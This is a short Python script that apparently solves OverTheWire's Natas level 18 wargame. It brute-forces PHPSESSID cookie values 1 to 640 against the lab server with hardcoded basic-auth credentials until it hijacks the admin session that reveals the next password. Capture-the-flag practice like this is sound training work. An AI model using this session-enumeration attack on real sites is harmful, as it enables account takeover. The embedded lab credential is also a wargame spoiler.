import requests
from requests.auth import HTTPBasicAuth

url = "http://natas18.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas18", "fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op")

response = requests.get(url, auth=auth, params={"debug": "1"})

for sessID in range(1, 641):
    headers = { 'Cookie': f'PHPSESSID={sessID}'}
    response = requests.get(url, auth=auth, headers=headers, params={"debug": "1"})

    check_admin = response.text.split('<div id="content">')[1].split('</div>')[0]

    if ("Password" in check_admin):
       print(check_admin)
       print(f"Session ID: {sessID}")
       break
